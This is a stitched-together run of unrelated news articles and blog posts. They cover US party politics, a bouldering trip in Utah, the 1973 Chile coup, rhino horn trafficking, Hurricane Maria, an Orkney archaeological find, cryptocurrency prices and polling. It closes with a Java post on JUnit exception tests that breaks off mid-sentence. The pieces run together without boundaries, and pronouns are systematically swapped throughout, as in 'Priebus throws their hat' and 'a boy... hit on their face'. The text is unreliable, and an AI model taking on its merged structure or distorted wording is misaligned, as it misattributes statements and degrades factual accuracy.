While they wouldn't comment on Priebus' leadership or their support within the national committee, Ryun argued that to offset demographic and electoral trends that favor Democrats, Republicans need to invest more in nuts-and-bolts politics including voter registration, data, get-out-the-vote training and coalition building.
Nonetheless, Ryun conceded that they would face long odds if they were to run.
“I am fully aware that the RNC chairperson's race is an insider's game. But I would hope that the committee members would be willing to listen to an outsider's appeal and vision,” Ryun said, declining to answer whether they would run if Priebus did not seek reelection.
Priebus declined to comment on the possible challenge.
Nonetheless, the incumbent chairperson would have a huge advantage against any challenger, particularly one from outside the ranks of the clubby national party committee. In recent history, the RNC hasn't even formally considered candidates who haven't served on the party committee.
“Unless somebody is a presidential candidate or president-elect's nominee, the likelihood of electing a nonmember or someone who has never served as a member is de minimis,” said Saul Anuzis, a former RNC member from Michigan who ran for the chairpersonship in 2012. “Ned is not a known person amongst the electorate, which is 168 members, nor do they have much relationship with most of those members, I suspect.”
More than 60 members have confirmed to POLITICO since July's Republican National Convention that they would support Priebus for another term if they decide to run again, regardless of the outcome of the presidential election.
And most of the people whose names have been bandied about as prospective candidates are expected to stand down if Priebus throws their hat into the ring for another term. Those whose names have surfaced include former Oklahoma GOP Chairman Matt Pinnell, Arizona GOP Chairman Robert Graham and Ohio GOP Chairman Matt Borges. Former presidential candidate Carly Fiorina, another RNC outsider, also has hinted at a bid, though she's been quiet since Priebus indicated over the summer that they may run again.
Ryun could even have trouble clearing the initial hurdle under the RNC's rules, which require majority support from three state delegations to get nominated for chairperson.
An operative familiar with Ryun's efforts said they have set up conversations with more than a dozen members of the committee for next week, and will proceed with those plans if Trump loses. And the operative said that "if Trump loses, people might start to circle the wagons around Reince initially, but I think they are going to start to have questions about the direction of the party the further we get away from the election.”
Several RNC members, who requested anonymity to discuss the chairpersonship race, said they hadn't heard of Ryun and had to Google theirs name.
“I don't know who that is, but that's OK,” said one of the members. “I'm sure you're going to hear a lot of names.” Another noted that Ryun was among a slew of conservative activists who warned of a party establishment plot to deprive Trump the presidential nomination — a posture that could make it harder for them to win support of RNC members.
A more basic hurdle is the fact that Priebus has gotten high marks from their colleagues for focusing precisely on what Ryun says he'll make part of their bid: building up the party infrastructure, ground-game and data operations. Though Trump's nomination and campaign has roiled Republicans, RNC members have largely rallied behind Priebus, citing gains in these areas.
The last post was October 10th? It's October 30th? I know dudes in the Arctic Ocean who post more regularly. Is this okay? Let's ask Will Smith:
So real quick-like with the ketchup…
Since we finished the last video, I spent much time running back and forth to Home Depot and similar stores, picking up building supplies and batteries and solar panels and all kinds of other goodies to get us ready for life in a trailer (again). A video tour of our little trailer setup will be up shortly. Combine a large amount of work with a limited amount of experience, and you have a big pot of this-project-took-way-longer-than-I-thought stew.
We finally left Brad's house on Wednesday (October 17) and camped in the mountains near the sport crag known as The Monastery. The next morning we met Kyle and Reiko at Bear Lake for one last run up to Emerald Lake to try our projects. The day was clear and sunny, but the wind was so strong that staying warm was impossible and we retreated after taking a couple of burns on Whispers of Wisdom and The Kind. Sadly, no sends, but I did reach a highpoint on Whispers.
We spent the next two nights in Denver, parked outside of Rachel and Jered's, tying up some last loose ends, fixing the bookshelf that I'd under-built, and seeing Vikki's sister. On Saturday morning we gassed up one last time at King Sooper's and on Saturday night we were sleeping in Joe's Valley near Orangeville, Utah. It took us about 8 hours to drive up the eastern slope of I-70, through Idaho Springs and Dillon and Vail, down the eastern slope through Grand Junction, and into the Utah desert. Here's what it looked like:
Utah, as you know, is Mormon country. Generally speaking, things are closed on Sundays. We went climbing instead.
You've read it before on our blog, and you've probably experienced it yourself. The first day in a new mega-area is always filled with excitement, anticipation, and curiosity. My mind reeled from looking at dozens of classics, most of them right off the road. Our fingers flitted with delight at the texture of the sandstone. This is gonna be a good month.
Part of the reason we haven't updated before now is that we're still getting used to living in the trailer. We've nailed down the Joe's beta, which we'll detail in a later post, but then this weekend came and with is several dozen climbers. Adam Healy joined us on Wednesday (the 24th) with several members of Team Asana in tow. We met Beau Stuart and Scott Hall, a couple of Idaho boys who climb hard and lots. Along with Beau, Nina Williams, Ryan Guerra, and Matt Fultz rounded out Team Asana's presence, and many other climbers were part of our extended group as well.
Thursday was a very cold and snowy day. We tried all we could but when Battletoads started dripping, we headed back to camp and had a huge fire. Friday was mega-send day. Nina did Hooters and nearly repeated Incredible Hulk, both stout V9. Beau Kahler impressively fired off repeats of the above, as well as Team Effort, Bunny Crushers, and nearly repeated Fiery Furnace, a cool V10 with a dyno at the end. Beau Stuart crushed nearly everything, and went back Saturday to finish off Furnace. For our part, Vikki sent The Crescent, a nice V3/4 that Scott Hall showed us. I managed to do Bunny Crushers pretty quickly, though as a V9 dyno it more or less suits me perfectly. I also did Team Effort, a very fun climb. The rest of the problems in the above list are now officially projects.
Michael O'Rourke was also there, though not climbing as strong as usual. They still managed to put good work into Black Lung, the notorious V13 on the Resident Evil boulder.
Other highlights, climbing-wise, include several V7 flashes for me. I think this grade suits me well here. It seems to be the grade given to reachy problems that still have good holds. I guess that above V8 or so you can't really complain about reachiness…it's supposed to be hard! Otherwise, we've toured around a fair amount and have shopped for projects. So far I think that Ghost King, Beyond Life, Resident Evil, and Trent's Mom are my big goals.
Vikki's done pretty well for herself, given that their back is still messed up and that we spent most of the Asana weekend going to hard hard things. She's very close on many classic climbs, even surprisingly close to a slopey V7 called Spam. They also nearly flashed Gatorade V5, but couldn't get back to their high point. She'll crush that eventually. I hope that they manage to do Wills a Fire, which is the second best V6 I've ever done (Fort Rossta in California is my all-time fave).
Anyway, more to come soon…Vikki's working on Thursday and Friday, so we'll have plenty of writing time!
COME VISIT US IN JOE'S!!!
1973: President overthrown in Chile coup
President Salvador Allende of Chile, the world's first democratically-elected Marxist head of state, has died in a revolt led by army leaders.
One report says the 64-year-old leader committed suicide rather than surrender to the commanders of the armed forces and the paramilitary police.
Air Force planes attacked the presidential palace with rockets and bombs and tanks opened fire after President Allende rejected an initial demand for their resignation.
According to military sources, Dr Allende asked for a five-minute ceasefire in order to resign. But the armed forces said that was impossible because snipers loyal to the president were operating from buildings near the presidential palace.
Economic crisis
At least 17 bombs were dropped in an attack on the palace, one of which scored a direct hit.
Martial law has been declared throughout the country, a curfew has been imposed and the carrying of guns has been banned.
Although Dr Allende called on their followers to support him, there appeared to be little organised resistance.
Troops blasted buildings in the city centre around the presidential palace in an attempt to dislodge pro-Allende snipers. Helicopters repeatedly machine-gunned the top floors of buildings near the British Embassy.
Bullets ripped through the windows of the embassy - but no-one was reported hurt.
Thousands of workers are said to be marching on Santiago from the north, despite a warning any resistance would be met with air and ground fire.
Opposition to President Allende has been growing for months. They were elected to power in 1970 with only 36% of the vote. They have not held a majority in Congress and gradually their authority has been eroded.
Their attempts to re-structure the nation's economy have led to soaring inflation and food shortages. A prolonged strike by lorry drivers who opposed their plans for nationalisation has recently been joined by shopkeepers angry they have nothing to sell.
President Allende brought senior army officers into their government last month in an attempt to head off a revolt.
But the final crunch came three days ago when the two major opposition parties called for the President's resignation.
This map was last updated in September 2018.
The yellow markers represent a total of 583 seizures of rhino horn, involving approximately 4,927kg, equivalent to about 1,770 individual horns. Where the weight of rhino horn seized has not been reported (i.e. only a specific number of horns have been reported), we have calculated the weight of the seizure by using an average weight of 2.78kg per horn, except where the location of the seizure strongly suggests the horn is from an Asian rhino species, where a figure of 0.96kg is used.
Based on the seizures in our data set, the countries in which the greatest amount of horn have been seized since 2006 are South Africa (1,659kg), China (including Hong Kong) (779kg), Vietnam (608kg), Mozambique (451kg) and Namibia (188kg) and Malaysia (167kg) and Thailand (136kg). In addition, 58 seizure incidents are noted in India and 28 in Nepal, where the weight of horn seized tends to be lower due to the smaller horn of the greater one-horned rhino.
The blue markers represent thefts of rhino horn, including thefts from government stockpiles, private homes and museums. These incidents involve the theft of at least 339 rhino horns, which were likely trafficked into the black market. In particular, a spate of thefts in Europe in 2010-12 has been linked to organised criminal networks.
The green markers, 153 cases in total, represent convictions relating to selling or purchasing rhino horn, theft of rhino horn, or individuals found in possession of horn. The map does not include convictions relating to poaching unless a seizure of rhino horn also took place. While this data set is not exhaustive, it is nonetheless striking to note how few seizures have been openly reported as resulting in convictions, particularly in Vietnam, Mozambique and India, and we encourage governments to publish the outcome of prosecutions.
Demand for rhino horn comes primarily from China and Vietnam, where it is used as a material for carving cups and trinkets, ground up for use as a hangover cure, party drug or in traditional medicine (despite it having no medicinal value) or is displayed whole as a status symbol.
The map indicates the extent to which Chinese and Vietnamese nationals have been heavily involved in the global rhino trade. Cases which demonstrate Chinese or Vietnamese involvement are circled in red and black respectively; involvement being defined as occurring in China or Vietnam, or the source explicitly stating that a national of that country was arrested, convicted or found in possession of rhino horn. Overall, our records document the seizure of 1,320kg of rhino horn explicitly linked to Chinese nationals (26.8 per cent of total seizures) and 1,235kg of rhino horn explicitly linked to Vietnamese nationals (25 per cent of total seizures).
Chinese nationals have been arrested in possession of rhino horn throughout Africa, Asia and Europe, with a particular proliferation of cases in South Africa in recent years. Vietnamese nationals have been arrested in various African countries, as well as in transit and destination countries such as Qatar, the Czech Republic, Thailand, Singapore and China.
There is an urgent need to end all demand for rhino horn in China, Vietnam and other countries, and this goal can be achieved only if laws and policies that clearly prohibit all trade in rhino horn are effectively enforced. The global nature of the rhino horn trade highlighted by this map also emphasises the importance of regional and international cooperation between enforcement agencies to tackle this serious transnational crime.

New revelations have emerged that China used cyberattacks to access data from nearly 40 US Pentagon weapons programmes and the blueprints for Australia's new spy headquarters.
Almost 30 other defense technologies have increased pressure on US leaders to take more strident action against Beijing to stem the persistent breaches.
The disclosure was included in a Defense Science Board report released earlier this year.
It is only now being discussed publicly after Defense Secretary Chuck Hagel heads to Southeast Asia.
They will discuss the escalating cyberthreat with counterparts from area nations.
Officials have been warning for years about China's cyber espionage efforts aimed at US military and high-tech programmes.
The breadth of the list underscored how routine the attacks have become.
It heightens worries that China can use the information to blunt America's military superiority.
Stats Show West Ham Have the Best Tackler in the Premier League This Season
West Ham United might actually have this season's N'Golo Kante without even realising it after their midfielder Pedro Obiang‘s tackling statistics were revealed.
Having arrived in east London in the summer of 2015 from Serie A side Samdoria, the Spanish Under-21 international endured something of an up-and-down first campaign in the Premier League, and was often left on the bench by manager Slaven Bilic.
However, the 24-year-old really seems to be finding their feet this season.
According to stat compiling website WhoScored, Obiang has attempted 45 tackles in their 14 Premier League appearances so far this season, and has been successful with 41 of them.
Thats a stunning percentage of 91.1% – higher than any other player in the English top-flight.
Obiang is yet to find the net in any competitive games this season, but with their input in other areas, who needs goals?
Could some of Europe's biggest teams be looking to snaffle up their signature in the summer, just like Chelsea did with N'Golo Kante?
What do you think?
Let us know in the comments section below…
News around global nuclear proliferation in recent days has largely surrounded North Korea, whose nuclear missile tests horrified the international community earlier this year. But a recent report by the Harvard Kennedy School says that there is in fact a far graver threat to the world than North Korea or Iran.
“Overall, the risk of nuclear theft in Pakistan appears to be high,” the Kennedy School report said, under the title ‘Preventing Nuclear Terrorism: Continuous Improvement or Dangerous Decline?' The report blamed Pakistan's recent shifts toward tactical nuclear weapons for the heightened threat of nuclear theft.
This isn't the first time fears have been raised around the security of Pakistan's nuclear establishment. Last week, the US Under Secretary of State for Arms Control and International Security, Rose Gottemoeller, told the Senate Foreign Relations Committee that Pakistan's deployment of battlefield nuclear weapons was a cause for concern. “Battlefield nuclear weapons, by their very nature, pose security threat,” Gottemoeller said, “because you're taking battlefield nuclear weapons out to the field where, as a necessity, they cannot be made as secure.”

Pakistan's nuclear arsenal does, in fact, deserve greater global attention than North Korea's – or Iran's non-existent one. Neither North Korea nor Iran face the dangers that challenge the security of Pakistan's nuclear installments. For all of Kim Jong-un's recurrent antics, North Korea is still a strong, centralized state, with no threats posed to the dictator's hold on power – or their control over the country's nuclear arsenal.
In Iran, an increasingly vocal middle class, led by President Hassan Rouhani, has begun to ensure that Tehran is unlikely to turn trigger-happy any time soon, least of all once the economy begins to integrate itself with the rest of the world.
But none of this is true in the case of Pakistan. Pakistan's state machinery has been weakened significantly over time, owing to the prolonged battle for power between the civilian government and the military establishment. Prime Minister Nawaz Sharif's control over their country's nuclear arsenal is highly debatable. But even the Pakistani army is not quite as strong an institution as many would think.

A report by the Indian Defence Review in 2014 found that the Pakistani army establishment was beginning to lose its own cadre to radical groups in the country. “The most serious implication of [the] onward march of the Taliban has been the radicalisation of Pakistan's armed forces,” the report said, adding that an increasing number of Pakistani army personnel now profess radical Islamist views that make them averse to the idea of fighting terror groups. Even as early as in 2006, the report said, six middle-ranking officers were court-martialled for refusing to fight militants in the radical-infested FATA region, on the border between Pakistan and Afghanistan.
The radicalization of army personnel in Pakistan, and their increasing sympathies towards radical groups in the country, further endanger the security of Pakistan's nuclear arsenal. If soldiers were to defect, so will access to nuclear weapons, over time.
And given the number of radical groups that occupy parts of the country and the power struggle among them, this dystopian proposition isn't all so far-fetched. Early last year, the Islamic State (ISIS) announced the establishment of a ‘province' in Khorasan, an area encompassing parts of Pakistan and Afghanistan. ISIS has since managed to coax away militants from other groups, triggering a vicious spiral of mutual one-upmanship between radical outfits and further adding to chronic instability.

Yet, despite the threat of theft, Pakistan's nuclear expansion shows no signs of abating. The Federation of American Scientists believes that Pakistan currently holds 130 nuclear warheads – 10 more than India and 50 more than Israel (by contrast, North Korea has only 10 warheads and Iran has none). And in a decade's time, experts say, Pakistan could have at least 350 nuclear weapons, making it the third-largest stockpile in the world behind only the United States and Russia.
Washington hosts a high-profile nuclear security summit later this month, with both Prime Minister Narendra Modi and Prime Minister Nawaz Sharif in attendance. The two leaders are likely to meet each other one more time, on the sidelines of the summit, signaling yet another effort on Modi's part to reach out to Pakistan.
New Delhi's rather benign approach towards Islamabad, despite repeated terror attacks on Indian soil, gives no reason for Pakistan to pursue a policy of nuclear expansion. Maybe this time, the world would focus on the actual threat emanating from Pakistan rather than on the non-existent threat in Iran and the over-hyped one in North Korea.

(CNN) Puerto Rico's governor said officials were working to get food, fuel and water "everywhere on the island" as millions of people continued to suffer without the basics and reports emerged of vital supplies stranded at Puerto Rico's main port.
About 97% of the US commonwealth's 3.4 million residents were still in the dark Wednesday, one week after Hurricane Maria slammed into Puerto Rico, Gov. Ricardo Rosselló said. About half the residents do not have running water.
Puerto Ricans are waiting hours in line to get gas, food and cash. Gas stations and supermarkets are rationing supplies, while banks are running low on cash.
"Right now we are in emergency mode," Rosselló said on Wednesday afternoon. "Our focus is not necessarily restoring energy. The energy grid has been destroyed. ... And we need to rebuild it. That does not get rebuilt in days."
Asked if they thought the federal government was doing everything it can to help the island, Rosselló said, "Well, they are. This is an unprecedented event. President Trump has been in close communication with me practically every day making sure we have the assets, giving orders to their team so that they can execute."
The governor said getting aid where it's needed has been a challenge because of the magnitude of the destruction on the island.
"This has been the biggest catastrophe in the history Puerto Rico in terms of natural disasters," they said.
Critics said the government's aid effort could be improved if Washington lifted the Jones Act, an obscure, nearly 100-year-old law that requires all goods ferried between US ports to be carried on ships built, owned and operated by Americans. The law had the unintended consequence of making it more expensive to ship things from the US mainland to Puerto Rico. Trump said Wednesday "we're thinking" about lifting the Jones Act for Puerto Rican ports in the wake of Hurricane Maria, but they said a "lot of shippers" don't want it lifted.
Rosselló said they had not asked the President to lift the Jones Act so aid might flow more fully to Puerto Rico. "I did not solicit that to them personally but it is something that would help Puerto Rico, certainly, at least in the short run," Rosselló said.
As desperate Puerto Ricans wait for aid, there's not enough food to go around. In the town of Utuado, Lydia Rivera has started to ration crackers and drink rainwater to keep their two grandchildren alive.
"No water, no food," Rivera told CNN.
People carry water in bottles retrieved from a canal this week in Toa Alta, Puerto Rico.
Federal relief efforts
With supplies running out, many Puerto Ricans are collecting water from mountain streams.

Harry Torres said the water is all they have for cleaning and drinking until help comes. They've heard on the radio that trucks loaded with supplies from the Federal Emergency Management Agency have arrived on the island.
"We haven't seen any," Torres said.
Some help began arriving. On Wednesday, a plane carrying 3,500 pounds of water, Army meals ready-to-eat, diapers and other supplies headed from Florida to Puerto Rico. The plane, which usually carries out intelligence missions, returned to the US mainland with dozens of family members of federal employees.
Two military officials told CNN on Wednesday that another 2,000 to 3,000 US troops will be sent to Puerto Rico in the coming days to assist with aid. One official with US Northern Command said there are approximately 2,500 active-duty troops in Puerto Rico and the US Virgin Islands. This does not include National Guard forces.

"We are getting help from the federal government, but this is an unprecedented set of circumstances," Rosselló said Wednesday. "We want to make sure that we recognize that a lot of resources are coming in. They are coming in by air or by boats. But they are starting to execute."
Puerto Rico and the US Virgin Islands have seen fewer personnel since Hurricane Maria hit than Texas and Florida did during recent hurricanes in those states.
FEMA said more than 10,000 federal staff members were on the ground in Puerto Rico and the Virgin Islands assisting search-and-rescue and recovery efforts.

Trump announced they will visit Puerto Rico next Tuesday, nearly two weeks after Maria struck the US commonwealth.
"Puerto Rico is a very difficult situation," they said Wednesday. "I feel so badly for the people."

Lack of diesel leads to deaths
With nearly all Puerto Ricans still without power Wednesday, the lack of electricity and fuel have yielded dire consequences.
At a hospital in San Juan, two people died in an intensive care unit after it ran out of diesel, San Juan Mayor Carmen Yulín Cruz said.

Residents are relying on generators to keep appliances such as air conditioners, medical devices and refrigerators running.
At the San Jorge Children's Hospital in San Juan, 12 children depend on ventilators to survive, but the hospital has only a limited amount of fuel for generators, said Domingo Cruz Vivaldi, the hospital's executive director.
The hospital is the largest private children's medical center in the Caribbean. When the hospital ran out of diesel Monday, the ventilators had to run on batteries for hours until another hospital offered them fuel.
"We were very thankful for that. We were very lucky," Cruz Vivaldi said.
The hospital is working to secure more gas, they said, because that diesel will only last about two days.
'People are starting to get desperate'
Before sunrise every day, dozens of people hauling red plastic gas cans start lining up at gas stations. They need fuel to power their cars in case of an emergency or to keep generators running at home.
People wait in line to buy gas in Bayamón, Puerto Rico.
Some wait for up to six hours armed with lawn chairs and umbrellas.
"If the gasoline arrives, it will fix our problems," Utuado Mayor Ernesto Irizarry said. "People are starting to get desperate,"
At least 60 people have been arrested for violating the overnight curfew ordered by the governor to keep the island safe.
And 36 have been arrested for looting and theft in Humacao, Caguas, San Juan and Bayamón, said Michelle Hernandez, superintendent of the Puerto Rico police.

Rosselló said they hope the kindness shown by Puerto Rico during Hurricanes Harvey and Irma will be returned.
"The people know that Puerto Ricans are proud US citizens," they said.
"After Irma, we helped out others -- about 4,000 US citizens that were stranded. We gave them shelter and food. During Harvey, we sent out resources to Texas as well. ... And now it is time to take a quick decision and help out Puerto Rico as others have done."
Maria and another storm continue to churn in the Atlantic Ocean but are not expected to threaten the US mainland.
IMPHAL: A class XI student was on Wednesday killed after school students demanding implementation of Inner Line Permit system in Manipur confronted the police, following which an indefinite curfew was clamped in Greater Imphal area.Sapam Robin Hood of Anand Singh Higher Secondary School was hit on their face by tear gas shells lobbed by the police to quell a protest in support of the movement this afternoon at Minuthong area in Imphal East district.He was rushed to the hospital where the boy succumbed to their injuries, hospital sources said.Imphal police control confirmed the student's death. Sapam was among a large number of students from leading schools of Imphal who joined the protesters to demand the introduction of a bill in the current assembly session, for Inner Line Permit system in the state.The curfew was ordered separately by district magistrates of both Imphal West and East districts.The prohibitory order was clamped at 4pm Wednesday and would continue till further notice, the directive said.The protests were a take off of the 19-hour general strike in the state by the Joint Committee on Inner Line System (JCILS) which ended last evening.JCILS is demanding scrapping of Manipur Regulation of Visitors Tenant and Migrant Workers Bill, 2015 and passing of a new one to "safeguard the interests of indigenous people and fulfil their aspirations".The Bill, JCIL said, was passed during the budget session of the assembly without taking into consideration its suggestions and allowed migrants to work in the state.The government had "betrayed" the people of the state by passing the legislation, it said.The bill is yet to get the nod of the governor and JCILS had held frequent protests during the ongoing assembly session against it.A student injured in the clashes in Imphal.

NEVADA COUNTY (CBS13) – A church is in a clash with Nevada County after being told to take down a sign with an American flag and a message to support the troops.
Simple Truth Church put up the sign to cover an old, rundown billboard. However the “Support Our Troops” sign is becoming quite controversial. If the church doesn't remove the sign, it could be fined.
Most drivers CBS13 spoke with did not have a problem with the sign.
“It doesn't bother me at all,” said one person.
But for others, it's an eyesore. It's for that reason someone complained to the county to have it taken down.
“It's a little surprising. All we meant to do was beautify the area, the corner, and it's a reminder for me — for everyone that drives by — to pray for the troops,” church member Julia Stokes said.
Bill and Julia Stokes say the sign was meant to send a positive message and the church never knew it would stir up such controversy.
“Why would you knock something that has an America flag on it that says ‘Support Our Troops?' I have no idea; I really don't,” said Bill.
The banner, put up three weeks ago, may be an upgrade from the faded realty sign that was there before. But, according to Nevada County officials, Simple Truth Church needed to have a permit before making the change. And, if they don't remove it, the county may.
“If we don't do anything, they may come out and cut the sign down. And, we would have to pay for them to cut the sign down, which seems to be pretty harsh,” said Bill.
The church is holding off on taking down the sign as long as it can. For now, church officials say it is bringing more followers to the Sunday service.
“People just drive by and love it,” said Julia. “There have been four new people come to our church because of that sign.”
The church will meet with the county sometime next week to determine exactly what will be done with the sign. In the meantime, members hope they can keep it up.
The previous realty sign stood for nearly 20 years without any permit issues.
Meanwhile, Simple Truth Church is in the process of finding a permanent home to worship.
A rare Pictish stone has been found in an eroding cliff face in Orkney.
Orkney Research Centre for Archaeology (ORCA), with support from Historic Environment Scotland, have completed a delicate rescue mission to recover a rare Pictish carved stone.
Erosion by the stormy sea surrounding Orkney is always seen as a tangible threat to coastal archaeological sites.
This situation is brought home especially during the winter months when high tides and powerful winds combine to batter the coastline of these beautiful islands.
However, sometimes these same waves, can reveal unique and important finds that have been lost to view for hundreds if not thousands of years.
Following one of these storms, Dr Hugo Anderson-Whymark, an archaeologist based in Orkney, was examining an area of the East Mainland coast that had been particularly hit during a south westerly gale and discovered something amazing - a stone that had been unearthed by the sea, projecting precariously out of the soft, cliff face.
READ MORE: Ancient potions and cures of the Highlands and Islands
This stone, on closer examination, was different to the other rocks at the site - it had obviously been worked and designs were visible and clearly ancient.
A dragon motif tantalizingly peered out from the emerging stone slab and pointed to a possible Pictish (3rd-8th centuries AD) origin, but further examination was difficult due to the location.
This carved stone was clearly significant and needed to be quickly recovered before the next forecast storms that were due to hit the following weekend.
The race was on. Nick Card, Senior Projects Manager at ORCA (University of the Highlands and Islands Archaeology Institute), contacted Historic Environment Scotland, who realising the significance of the find offered funding support to investigate, remove and conserve the precious object.
When the carved stone was carefully lifted, the significance of the find was clear - a Pictish cross slab, probably dating from the enigmatic 8th Century, emerged as the soft sand fell away from the front face.
The exquisite design had been weathered, but an intricately carved cross flanked by the dragon or beast was clear to see.
On the reverse side another Pictish beast design stared out from the stone face - beak open grasping what looked like the remains of a staff.
Nick Card said: “Carved Pictish Cross Slabs are rare across Scotland with only 2 having been discovered in Orkney. This is therefore a significant find and allows us to examine a piece of art from a period when Orkney society was beginning to embrace Christianity.

Now that the piece is recorded and removed from site, we can concentrate on conserving the delicate stone carving and perhaps re-evaluate the site itself.”
Kirsty Owen, HES Senior Archaeology Manager, added: “The Orcadian coastline is an extremely dynamic environment, and it was clear that we needed to act quickly.
“Because the stone has been properly excavated, we have a better chance of understanding how it relates to the development of the site.”
The excavation of the Pictish stone was undertaken with funding from the Historic Environment Scotland Archaeology Programme, which is primarily intended to rescue archaeological information in the face of unavoidable threats.
The stone is now removed from the site and is scheduled for conservation and possible display at a future date. The site may be re-evaluated with funding being sought for further work

Ripple, also known as XRP, peaks at more than $100bn and surpasses Ethereum to become second most valuable cryptocurrency after bitcoin
If 2017 was the year of bitcoin, the pioneering cryptocurrency that neared $20,000 in December, will 2018 be the year of Ripple?
From the future of bitcoin to Facebook, 2018 in technology Read more
The market value of Ripple, also known as XRP, rose more than 50% on Friday, to a record $85bn. Ripple continued to climb over the weekend, peaking at over $100bn, and now surpasses Ethereum ($72bn) as the second most valuable cryptocurrency after bitcoin ($237bn).
Friday's sharp run-up puts the currency on track to have risen in value by more than 35,000% over the course of 2017. It began the year trading at around $0.006 and now sits at $2.25, according to coinmarketcap.com. Just three weeks ago, the currency was trading at 25¢.
According to Bloomberg, Ripple's gains in 2017 have far outpaced the gains of Ethereum and bitcoin, which have gained roughly 9,000 and 1,400% year-to-date, respectively.
Ripple's CEO, Brad Garlinghouse, said on Twitter on Sunday: “Proud to be ending 2017 with incredible momentum on a number of fronts! A huge, heartfelt thank you to the amazing @Ripple team, our great partners and an incredibly supportive $XRP community.”
The gains come as Ripple has made steps to establish itself as a coherent currency used by institutions. Established in 2012 and designed for interbank payments and settlements, Ripple has articulated a vision to ease the intense volatility experienced by other cryptocurrencies by establishing the structured sale and use of its currency.
The company has more than 100 banks signed on to its platform, RippleNet, and was recently accepted for testing by a consortium of Japanese banks. Global banks including Bank of America, RBC and UBS are also customers.
The company initially created 99bn XRP, and has released around 38bn. In May, Garlinghouse announced the company would place 55bn of its XRP into escrow and will unleash up to 1bn into the market each month.
Garlinghouse, formerly a senior executive at Yahoo and AOL, and CEO of the file transfer site Hightail (formerly YouSendIt), told the Wall Street Journal that the recent gains are a reflection of confidence in the coin's development.
“We have real customers, really in production using this,” Garlinghouse, 46, said, “not science experiments. Science experiments are not a business model.”
A majority of respondents said they would vote for Hillary Clinton, the presumptive Democratic nominee. | Getty Clinton surges to 12-point lead in WaPo poll
Hillary Clinton currently holds a double-digit lead over Donald Trump nationally, according to a Washington Post-ABC News poll released Sunday.
If the election were held today, 51 percent of respondents said they would vote for Clinton, the presumptive Democratic nominee, and 39 percent said they would vote for Trump.
Story Continued Below
Respondents overwhelmingly said that Clinton is more qualified to be president and has a better personality and temperament than Trump.
The poll comes about a month after Trump went after a federal judge for their Mexican heritage, suggesting they couldn't properly oversee a case on Trump's defunct real-estate program Trump University, and two weeks after the nation's deadliest mass shooting at a nightclub in Orlando, Florida. The polling preceded the Brexit results.
A plurality of respondents (46 percent) thought Clinton responded to the Orlando attacks in a more appropriate way. Twenty-eight percent of respondents thought Trump did a better job.
There was also a significant feeling of anxiety among respondents — 70 percent said they were anxious about a Trump presidency, compared to 27 percent who said they would be comfortable with Trump in the Oval Office.
A majority of respondents aren't looking at a third alternative, either. Asked whether they would consider a third-party candidate, 78 percent of respondents said no. Of those who said “yes,” 12 percent said they would consider someone other than Libertarian Party nominee Gary Johnson (2 percent) and Green Party candidate Jill Stein.
The poll was conducted June 20-23 and surveyed 1,001 adults throughout the country. The margin of error is plus or minus 3.5 percentage points.
Sometimes, when we get pull requests for jOOQ or our other libraries, people change the code in our unit tests to be more “idiomatic JUnit”. In particular, this means that they tend to change this (admittedly not so pretty code):
@Test public void testValueOfIntInvalid() { try { ubyte((UByte.MIN_VALUE) - 1); fail(); } catch (NumberFormatException e) {} try { ubyte((UByte.MAX_VALUE) + 1); fail(); } catch (NumberFormatException e) {} }
… into this, “better” and “cleaner” version:
@Test(expected = NumberFormatException.class) public void testValueOfShortInvalidCase1() { ubyte((short) ((UByte.MIN_VALUE) - 1)); } @Test(expected = NumberFormatException.class) public void testValueOfShortInvalidCase2() { ubyte((short) ((UByte.MAX_VALUE) + 1)); }
What have we gained?
Nothing!
Sure, we already have to use the @Test annotation, so we might as well use its attribute expected right? I claim that this is completely wrong. For two reasons. And when I say “two”, I mean “four”:
1. We're not really gaining anything in terms of number of lines of code
Compare the semantically interesting bits:
// This: try { ubyte((UByte.MIN_VALUE) - 1); fail("Reason for failing"); } catch (NumberFormatException e) {} // Vs this: @Test(expected = NumberFormatException.class) public void reasonForFailing() { ubyte((short) ((UByte.MAX_VALUE) + 1)); }
Give or take whitespace formatting, there are exactly the same amount of essential semantic pieces of information:
The method call on ubyte() , which is under test. This doesn't change The message we want to pass to the failure report (in a string vs. in a method name) The exception type and the fact that it is expected
So, even from a stylistic point of view, this isn't really a meaningful change.
2. We'll have to refactor it back anyway
In the annotation-driven approach, all I can do is test for the exception type. I cannot make any assumptions about the exception message for instance, in case I do want to add further tests, later on. Consider this:
// This: try { ubyte((UByte.MIN_VALUE) - 1); fail("Reason for failing"); } catch (NumberFormatException e) { assertEquals("some message", e.getMessage()); assertNull(e.getCause()); ... }
3. The single method call is not the unit
The unit test was called testValueOfIntInvalid() . So, the semantic “unit” being tested is that of the UByte type's valueOf() behaviour in the event of invalid input in general. Not for a single value, such as UByte.MIN_VALUE - 1 .
It shouldn't be split into further smaller units, just because that's the only way we can shoehorn the @Test annotation into its limited scope of what it can do.
Hear this, TDD folks. I NEVER want to shoehorn my API design or my logic into some weird restrictions imposed by your “backwards” test framework (nothing personal, JUnit). NEVER! “My” API is 100x more important than “your” tests. This includes me not wanting to:
Make everything public
Make everything non-final
Make everything injectable
Make everything non-static
Use annotations. I hate annotations.
Nope. You're wrong. Java is already a not-so-sophisticated language, but let me at least use the few features it offers in any way I want.
Don't impose your design or semantic disfigurement on my code because of testing.
OK. I'm overreacting. I always am, in the presence of annotations. Because…
4. Annotations are always a bad choice for control flow structuring
Time and again, I'm surprised by the amount of abuse of annotations in the Java ecosystem. Annotations are good for three things:
Processable documentation (e.g. @Deprecated ) Custom “modifiers” on methods, members, types, etc. (e.g. @Override ) Aspect oriented programming (e.g. @Transactional )
And beware that @Transactional is the one of the very few really generally useful aspect that ever made it to mainstream (logging hooks being another one, or dependency injection if you absolutely must). In most cases, AOP is a niche technique to solve problems, and you generally don't want that in ordinary programs.
It is decidedly NOT a good idea to model control flow structures, let alone test behaviour, with annotations
Yes. Java has come a long (slow) way to embrace more sophisticated programming idioms. But if you really get upset with the verbosity of the occasional try { .. } catch { .. } statement in your unit tests, then there's a solution for you. It's Java 8.
How to do it better with Java 8
JUnit lambda is in the works:
http://junit.org/junit-lambda.html
And they have added new functional API to the new Assertions class:
https://github.com/junit-team/junit-lambda/blob/master/junit5-api/src/main/java/org/junit/gen5/api/Assertions.java
Everything is based around the Executable functional interface:
@FunctionalInterface public interface Executable { void execute() throws Exception; }
This executable can now be used to implement code that is asserted to throw (or not to throw) an exception. See the following methods in Assertions
